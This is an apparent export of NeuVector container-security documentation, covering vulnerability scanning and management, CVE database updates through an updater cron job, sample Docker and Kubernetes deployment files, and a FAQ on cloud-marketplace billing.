","version":"Next 🚧","tagName":"h3"},{"title":"Managing Vulnerabilities and Compliance​","type":1,"pageTitle":"Scanning & Compliance","url":"/next/scanning/scanning#managing-vulnerabilities-and-compliance","content":" NeuVector provides several ways to review vulnerability and compliance scan results and generate reports. These include:  Dashboard. Review summary vulnerabilities and see how they impact the overall Security Risk Score.Security Risks Menu. View the impact of vulnerabilities and compliance issues and generate reports with advanced filtering.Assets Menu. See vulnerability and compliance results for each asset such as registries, nodes, and containers.Notifications -&gt; Risk Reports. View scan events for each asset.Response Rules. Create responses such as web hook notifications or quarantines based on scan results.REST API. Trigger scans and pull scan results programmatically to automate the process.SYSLOG/Webhook Alerts. Send scan results to a SIEM or other enterprise platforms.  Security Risks Menu​  These menu's combine the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting. The Compliance profile menu enables customization of the PCI, GDPR and other compliance checks for generating compliance reports.    See the next section on Vulnerability Management for how to manage vulnerabilities in this menu, and the Compliance &amp; CIS Benchmarks section for reporting on CIS Benchmarks and industry compliance such as PCI, GDPR, HIPAA, and NIST.  Assets Menu​  The Assets menu reports vulnerabilities and compliance checks results organized by the asset.  Platforms. The orchestration platform such as Kubernetes, and vulnerability scans of the platform.Nodes. Nodes/hosts protected by NeuVector Enforcers, and results of Compliance checks such as CIS benchmarks and custom checks, as well as host vulnerability scans.Containers. All containers in the cluster including system containers, and the results of Compliance checks such as CIS benchmarks and custom checks, as well as container run-time Vulnerability scans. Process activity and performance statistics can also be found here.Registries. Registries/repositories scanned by NeuVector. Layered image scanning results are found here, and scan results can be used in Admission control rules (found in Policy -&gt; Admission Controls).  note Custom compliance checks as mentioned above are defined in the Policy -&gt; Groups menu.  Automated Run-Time Scanning​  NeuVector can scan running containers, host nodes, and the orchestration platform for vulnerabilities. In the Assets menu for Nodes or Containers, enable Auto-Scan by clicking on the Vulnerabilities tab for a node or container, then Auto-Scan (appears in upper right) to scan all running containers, nodes, and platform including newly started ones once they start running. You can also select a container or node and scan it manually.  You can click on each vulnerability name/CVE that is discovered to retrieve a description of it, and click on the inspect arrow in the popup to see the detailed description of the vulnerability.    The auto-scan will also be triggered when ever there is an update to the NeuVector CVE database. Please see the section Updating the CVE Database for details.  ","version":"Next 🚧","tagName":"h3"},{"title":"Automated Actions, Mitigations, and Responses Based on Vulnerabilities​","type":1,"pageTitle":"Scanning & Compliance","url":"/next/scanning/scanning#automated-actions-mitigations-and-responses-based-on-vulnerabilities","content":" Admission control rules can be created to prevent deployment of vulnerable images based on Registry scanning results. See the Security Policy -&gt; Admission Control section for details.  Please see the section Security Policy -&gt; Response Rules for instructions for creating automated responses to vulnerabilities detected either during registry scanning, run-time scanning, or CIS benchmarks. Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size. Please see the multiple scanners section for more details.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. ","version":"Next 🚧","tagName":"h3"},{"title":"Vulnerability Management","type":0,"sectionRef":"#","url":"/next/scanning/scanning/vulnerabilities","content":"","keywords":"","version":"Next 🚧"},{"title":"Managing Vulnerabilities with NeuVector​","type":1,"pageTitle":"Vulnerability Management","url":"/next/scanning/scanning/vulnerabilities#managing-vulnerabilities-with-neuvector","content":" NeuVector enables automated vulnerability scanning and management throughout the pipeline. Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted. ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Examples for Special Deployments Using the Allinone Container","type":0,"sectionRef":"#","url":"/next/special","content":"Deployment Examples for Special Deployments Using the Allinone Container How to deploy NeuVector using Kubernetes, OpenShift, Docker EE/UCP, Rancher, public cloud Kubernetes services and more…","keywords":"","version":"Next 🚧"},{"title":"Updating the CVE Database","type":0,"sectionRef":"#","url":"/next/scanning/updating","content":"","keywords":"","version":"Next 🚧"},{"title":"Updating the NeuVector CVE Vulnerability Database​","type":1,"pageTitle":"Updating the CVE Database","url":"/next/scanning/updating#updating-the-neuvector-cve-vulnerability-database","content":" The Scanner image/pod performs the scans with its internal CVE database. The scanner image is updated on the NeuVector Docker Hub registry with the latest CVE database frequently, as often as daily if there are updates. To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.  For registry scanning, if the box 'Rescan after CVE DB update' is enabled, all images in that registry will be rescanned after a CVE database update. For run-time scanning, all running assets will be rescanned after a CVE database update if the Auto-Scan feature is enabled.  Updater Cron Job​  This cron job is deployed by NeuVector automatically as part of the sample deployment, so is typically not required to start manually.  The Updater is a container image which, when run, restarts the scanner deployment, forcing the pull of the latest Scanner image. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up.  The cron job sample neuvector-updater.yaml below for Kubernetes 1.8 and later runs the updater every day at midnight. The schedule can be adjusted as desired.  Sample updater yaml:  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   note If the allinone container was deployed instead of the controller, replace neuvector-svc-controller.neuvector with neuvector-svc-allinone.neuvector  To run the cron job  kubectl create -f neuvector-updater.yaml   ","version":"Next 🚧","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Updating the CVE Database","url":"/next/scanning/updating#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  For docker native:  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner.  For docker-compose  docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d   Sample docker run  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"Next 🚧","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"Updating the CVE Database","url":"/next/scanning/updating#cve-database-version","content":" The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the scanner container logs or updater image.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Using kubectl:  kubectl logs neuvector-scanner-pod-5687dcb6fd-2h4sj -n neuvector | grep version   Sample output:  2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   Or for docker:  docker logs &lt;scanner container id or name&gt; | grep version   2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   ","version":"Next 🚧","tagName":"h3"},{"title":"Manual Updates on Kubernetes​","type":1,"pageTitle":"Updating the CVE Database","url":"/next/scanning/updating#manual-updates-on-kubernetes","content":" Below is an example for manually updating the CVE database on Kubernetes or OpenShift.  Run the updater file below  kubectl create -f neuvector-manual-updater.yaml   Sample file  apiVersion: v1 kind: Pod metadata: name: neuvector-updater-pod namespace: neuvector spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"Next 🚧","tagName":"h3"},{"title":"General Guidelines","type":0,"sectionRef":"#","url":"/next/special/general","content":"","keywords":"","version":"Next 🚧"},{"title":"Testing NeuVector Using the Allinone Container​","type":1,"pageTitle":"General Guidelines","url":"/next/special/general#testing-neuvector-using-the-allinone-container","content":" The examples in this section deploy the Allinone and Enforcer containers. This is useful for trying out NeuVector, especially on non-Kubernetes (e.g. docker native) environments. For Kubernetes based deployments using the latest NeuVector Helm chart is recommended. Please see the section Deploying NeuVector.  ","version":"Next 🚧","tagName":"h3"},{"title":"General Guidelines for Deployment​","type":1,"pageTitle":"General Guidelines","url":"/next/special/general#general-guidelines-for-deployment","content":" Prepare your host environment for proper installation. Make sure the NeuVector containers can communicate with each other between hosts. Then review and edit the sample files for you environment.  Generally, it is important to do the following:  Label nodes appropriately. If you use node labels to control where the allinone or controller is deployed, label them before deploying.Make sure volumes can be mapped properly. For example  volumes: - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Open required ports on hosts. Make sure the required ports are mapped properly and open on the host. The allinone requires 8443 (if using the console), 18300, 18301, 18400, and 18401. The Enforcer requires 18301 and 18401. Edit the CLUSTER_JOIN_ADDR. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the sample files for both allinone and enforcer.  ","version":"Next 🚧","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"General Guidelines","url":"/next/special/general#accessing-the-console","content":" Please see the first section Basics -&gt; Connect to Manager for options for turning off https or accessing the console through a corporate firewall which does not allow port 8443 for the console access. ","version":"Next 🚧","tagName":"h3"},{"title":"Testing","type":0,"sectionRef":"#","url":"/next/testing","content":"Testing Evaluate and Test NeuVector Using Sample Applications","keywords":"","version":"Next 🚧"},{"title":"Public Cloud Marketplaces","type":0,"sectionRef":"#","url":"/next/special/public-cloud","content":"","keywords":"","version":"Next 🚧"},{"title":"The Listing​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#the-listing","content":" What is the SUSE NeuVector Prime listing on the Cloud Marketplace?  By selecting the NeuVector listing from the public cloud marketplace, customers can deploy NeuVector to their Kubernetes environment with the advantage of having monthly billing via that cloud provider.  Where do I find NeuVector Prime in the Cloud Marketplace?  The listings can be found in the AWS and Azure Marketplace, there are two listings:  For AWS Marketplace: NeuVector Prime with 24x7 Support (non-EU and non-UK only) NeuVector Prime with 24x7 Support (EU and UK only) For Azure Marketplace: NeuVector Prime with 24x7 Support (non-EU and non-UK only) NeuVector Prime with 24x7 Support (EU and UK only)  Why are there 2 listings, which one should I use?  We have 2 listings for NeuVector Prime, in AWS &quot;EU and UK only&quot; and &quot;non-EU and non-UK only&quot; and in Azure &quot;24x7 Support&quot; and &quot;24x7 Support (EMEA Orders Only)&quot;, you should pick the listing that reflects where your cloud account gets billed.  Are these listings available in all countries?  The NeuVector Prime listing on the public cloud is not available to purchase in all countries. Your billing country is based on the cloud Account ID used to do the deployment. Please read the addendum at the end of this FAQ for a list of countries that can and cannot transact NeuVector Prime,via the marketplace.  My cloud account is in the USA, but I want to deploy NeuVector in another region, a region that is in a country where I currently cannot transact NeuVector, is this possible?  Yes. As long as your cloud account is billed to one of the allowed countries, it is possible to deploy NeuVector in any region.  Is this listing available in China?  Whilst it is not possible to transact/bill NeuVector Prime in China, it is possible to deploy into regions in China. Please read the addendum at the end of this FAQ for a list of countries that can and cannot transact NeuVector via the cloud marketplace.  ","version":"Next 🚧","tagName":"h2"},{"title":"Billing​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#billing","content":" I have an existing NeuVector subscription; can I use this on the public cloud?  BYOS (Bring Your Own Subscription) NeuVector Prime deployments are supported on the public cloud, but billing would be through your normal software purchase channels and not through the cloud provider marketplace. Once the existing subscription term ends, you can purchase NeuVector Prime via the cloud marketplace and reconfigure your cluster to support monthly billing through the cloud provider.  I have an existing deployment covered by a NeuVector subscription; can I use this new listing in the cloud marketplace for new deployments?  Yes, the marketplace listing works independently from your existing NeuVector Prime subscriptions. Please remember that support processes may be different for deployments using your existing subscription and those billed via the cloud Marketplace.  Tell me more about how the billing for NeuVector Prime works via the cloud?  When purchasing NeuVector Prime through the cloud provider marketplace, the billing is as follows:  Billing is monthly and handled via the cloud provider marketplace. Nodes are counted hourly when NeuVector is active and added to a usage total. An average node count is calculated for the month. There is a monthly usage charge for each node in the average node count. The monthly usage charge depends on the number of nodes in use.  Nodes count There is a 5-node minimum, if the average node count is less than 5 nodes, the charge will be for 5 nodes.  What are the pricing tiers?  NeuVector Prime has different pricing tiers when purchasing via the cloud marketplace. This is based on the number of nodes on which NeuVector is deployed. Details of the tiers are below, please check the listing for further pricing information.  Table 1. Pricing tiers  Tier\tNodes (from)\tNodes (to)1\t5\t15 2\t16\t50 3\t51\t100 4\t101\t250 5\t251\t1000 6\t1000\t15  Is there a way to try NeuVector Prime before purchasing?  If using the NeuVector Prime listing in the cloud provider marketplace, billing commences from the time of deployment. NeuVector can also be deployed manually using the standard documentation and repositories. When ready to add support to your NeuVector deployment and have this billed via the cloud marketplace, follow the available documentation.  How does SUSE calculate the ‘average number of nodes’ to bill for?  The average node count is calculated by adding the number of active nodes (counted hourly) and dividing by the number of hours NeuVector has been active in the billing cycle.  Below are 3 examples of how the average node count is calculated.  note The example uses 730 hours for the billing cycle. Actual billing would depend on the number of days in the month and the resulting billing cycle.  Table 2. Usage calculations for different scenarios  \tHours Active\tNodes\tUsage Total\tAverage Node count\tNode billedStatic Usage\t730\t10\t7300\t10\t10 @Tier 1 Bursting Model\t730\t10 (562 Hours) &amp; 20 (168 Hours)\t10660\t15\t15 @Tier 1 (Rounded from 14.6) Transient Cluster\t336\t20\t6720\t20\t20 @Tier 2  Definitions Static usage: Using NeuVector on 10 nodes, for 1 month (730 hours) with no additional nodes added in the month. Bursting Model: Using NeuVector on 10 nodes for 3 weeks (562 hours) in the month, bursting to 30 nodes for 1 week (168 hours). Transient cluster: A temporary deployment of NeuVector on 20 nodes for 2 weeks (336 hours).  Are special commercial terms available?  Depending on the deployment, it may be possible to secure special commercial terms. e.g. An annual subscription would be handled via an AWS private offer. Please contact SUSE for more information.  Can my spend on NeuVector Prime count towards my cloud discount program such as AWS EDP or Azure’s MACC?  For AWS, the spend can count towards your EDP. Please contact your AWS Sales Team for more details. For Azure, the spend can count towards your MACC. Please contact your Microsoft Azure Sales Team for more details.  How do I purchase NeuVector Prime for additional nodes?  Once NeuVector has been deployed from the listing on the cloud marketplace and billing is active, there is no need to make a specific purchase for additional nodes. Billing is dynamic and based on the number of nodes where NeuVector is deployed. Just add NeuVector to additional nodes in federated clusters as needed.  Is this an annual commitment, will it auto-renew?  By default, the NeuVector Prime listing in the cloud provider marketplace is billed on a monthly cycle, based on usage. Billing is on-going for as long as NeuVector is deployed.  Depending on the deployment, custom monthly pricing may be available. This applies to AWS and Azure deployments.  ","version":"Next 🚧","tagName":"h2"},{"title":"Technical (Billing)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#technical-billing","content":" Do I need a managed Kubernetes cluster running in my cloud provide to install NeuVector Prime and be billed via the marketplace?  Yes. For AWS, to benefit from monthly billing via the AWS Marketplace, the primary cluster must be an EKS Cluster running in your AWS Account. For Azure, to benefit from monthly billing via the Azure Marketplace, the primary cluster must be an AKS Cluster running in your Azure Account.  On which Kubernetes distributions can the NeuVector Prime Cloud Marketplace listing be deployed?  For AWS, the NeuVector Prime AWS Marketplace listing must be deployed on an Amazon EKS. For Azure, the NeuVector Prime Azure Marketplace listing must be deployed on AKS via the marketplace offering.  info Downstream clusters can run any Supported Kubernetes platform, such as RKE, RKE2, K3s, AKS, EKS, GKE, vanilla Kubernetes, OpenShift, Mirantis Kubernetes Engine, and so on. Please see Supported Platforms.  What is the deployment mechanism?  For AWS, the Marketplace listing for NeuVector Prime is deployed using Helm. For Azure, the NeuVector Prime Azure Marketplace listing is deployed using the Azure Portal (and the deployment is CNAB based).  What is the easiest way to get started?  The way to get started is to add the cloud marketplace listing for NeuVector Prime to a managed cubernetes cluster, such as as EKS or AKS. Follow the instructions in the usage section, a Helm chart in AWS and the Azure Portal for Azure, takes care of the application installation and setting up billing.  What version of NeuVector is installed when using the marketplace listing?  The marketplace listing for NeuVector Prime is tied to a specific version of NeuVector, typically the latest version available at the time of the listing update. Please check the listing for further information.  I need a prior version of NeuVector installed, can I still use the listing?  No. There is no choice of NeuVector version when deploying using the marketplace listing. If a prior version of NeuVector is required, must be installed manually using the standard documentation.  How often is the listing updated (including the version of NeuVector)?  The marketplace listing is tied to a specific version of NeuVector, usually the latest version available at the time the listing was last updated.  Typically, the marketplace listing is updated quarterly, or more frequently if there are security issues. NeuVector itself is updated with major, minor, or patch versions every 6-8 weeks.  To update the NeuVector product to a current version before the marketplace listing is updated, please see Updating NeuVector.  I have many Kubernetes clusters across multiple cloud accounts, does the NeuVector billing still work and enable tiered pricing?  Yes. Downstream (federated) clusters running NeuVector can be deployed across single or multiple cloud accounts, on-premises or even across diffferent public clouds. Downstream nodes report up to the primary NeuVector deployment. This process is called federation and is needed to enable tiered pricing for your NeuVector deployments.  Billing is routed to the cloud provider account in which the primary cluster is running.  I have multiple independent clusters, each running a separate installation of the NeuVector Prime marketplace listing, how is this billed?  As the NeuVector deployments are independent, each cluster is billed separately from the others. It is not possible to benefit from tiered pricing across clusters unless the NeuVector deployments are federated. Federation requires that only the primary cluster (not downstream remotes) be installed with the NeuVector Prime marketplace listing. Learn more about federation in Enterprise Multi-Cluster Management.  If Federation is not possible, consider custom terms from SUSE.  How can I federate NeuVector to benefit from tiered pricing across all deployments?  The primary cluster must be running on a managed kubernetes cluster. This is EKS in the AWS Cloud, or AKS in Azure. The cluster must be running the NeuVector Prime marketplace listing.  attention There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed externally to its cluster by either a primary or remote service. See Enterprise Multi-Cluster Management for more information on federating clusters.  I have purchased multiple SUSE products from the public cloud marketplace (e.g., Rancher Prime and NeuVector Prime), does the marketplace billing method still work?  Yes. The billing mechanisms for the two deployments are independent and will be billed separately via the marketplace.  I already have an existing cluster in place and want to add NeuVector Prime and have this billed via the marketplace. Is this possible?  Yes, providing it is an EKS cluster in AWS, or AKS in Azure. Simply deploy the AWS Marketplace listing for NeuVector Prime to your EKS or AKS cluster.  I already have an existing cluster with NeuVector deployed, can I just install the NeuVector Prime marketplace listing and have support billed via the cloud marketplace?  Yes. This is possible by redeploying the NeuVector Prime from the cloud provider marketplace listing. Please follow the documentation to back up the existing NeuVector configuration, as it may be necessary to restore the configuration into the new deployment.  ","version":"Next 🚧","tagName":"h2"},{"title":"Technical (Product)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#technical-product","content":" How do I get support?  It is very simple to open a support case with SUSE for NeuVector. Create a ‘supportconfig’ via the NewVector UI and upload the output to the SUSE Customer Center. The support config bundle can be exported from the NeuVector console under Settings &gt; Configuration.  tip For multi-cluster (federated) deployments, export the supportconfig bundle from the primary cluster only. The NeuVector Prime billing mechanism must be active on the primary cluster to open a support case.  Is there any difference between the NeuVector Prime product on the cloud marketplace compared to the versions I can run in my own data center or install manually in the cloud?  The NeuVector Prime product in the cloud marketplace is the same product with the same functionality as what you would install manually in the cloud or run on-premises. The only difference is the billing route.  Does the primary cluster (responsible for billing) need to run 24/7?  To ensure continuity with support, it is recommended that the primary NeuVector Prime cluster always remains active.  What if the primary cluster responsible for billing is unable to connect to the cloud provider billing framework?  There may be multiple reasons why the primary cluster is unable to connect to the billing framework, but it is the customer’s responsibility to ensure that the primary cluster is active and connected. While the cluster is not connected to the billing framework, it is not possible to raise a support request.  My primary cluster has been offline, what happens with billing when it reconnects?  If the primary cluster is offline or disconnected from the cloud provider billing framework for a period of time, when it reconnects, the stored usage data will be uploaded and will appear on your next marketplace bill.  note Depending on when in the month the primary cluster gets reconnected you may have several months of usage on your next billing cycle.  How do I get fixes and updates to NeuVector?  NeuVector is updated with major, minor, or patch versions every 6-8 weeks. To update NeuVector to a current version before the NeuVector Prime marketplace listing is updated, please see Updating NeuVector.  ","version":"Next 🚧","tagName":"h2"},{"title":"Miscellaneous​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#miscellaneous","content":" Where can I find out more about the NeuVector Prime Marketplace listing?  For AWS: You can find out more about the NeuVector Prime AWS Marketplace listing in the NeuVector documentation. For Azure: You can find out more about the NeuVector Prime AWS Marketplace listing in the NeuVector documentation.  Where can I find out more about NeuVector?  Learn more about NeuVector and NeuVector Prime with:  NeuVector by SUSE - full lifecycle container security NeuVector by SUSE documentation  ","version":"Next 🚧","tagName":"h2"},{"title":"Appendix​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/next/special/public-cloud#appendix","content":" Countries that can transact NeuVector Prime through the cloud marketplace Please see the Geographical Availability of NeuVector Prime and other SUSE Marketplace products at this link. ","version":"Next 🚧","tagName":"h2"},{"title":"Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/next/special/docker","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy to Swarm Cluster​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/next/special/docker#deploy-to-swarm-cluster","content":" To deploy NeuVector using a Swarm cluster, first pull the NeuVector images using Docker UCP in the Images menu. You may need to add a version number to get the latest version on Docker Hub.  Currently, Swarm/UCP does not support the seccomp capabilities (cap_add options) or deploying in ‘privileged mode’ so the NeuVector containers will need to be deployed from the command line using docker-compose or run. See the sample compose files for the allinone and enforcer below.  The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping, for example 9443:8443 for the allinone container in the examples below. After the NeuVector application is successfully deployed, login to the console on port 9443 of the allinone host.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy on Docker Swarm Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/next/special/docker#deploy-on-docker-swarm-using-privileged-mode","content":" The following is an example of the docker-compose file to deploy the all-in-one container on the first node. Because the all-in-one container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  Deploy all-in-one using docker-compose (privileged mode):  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports 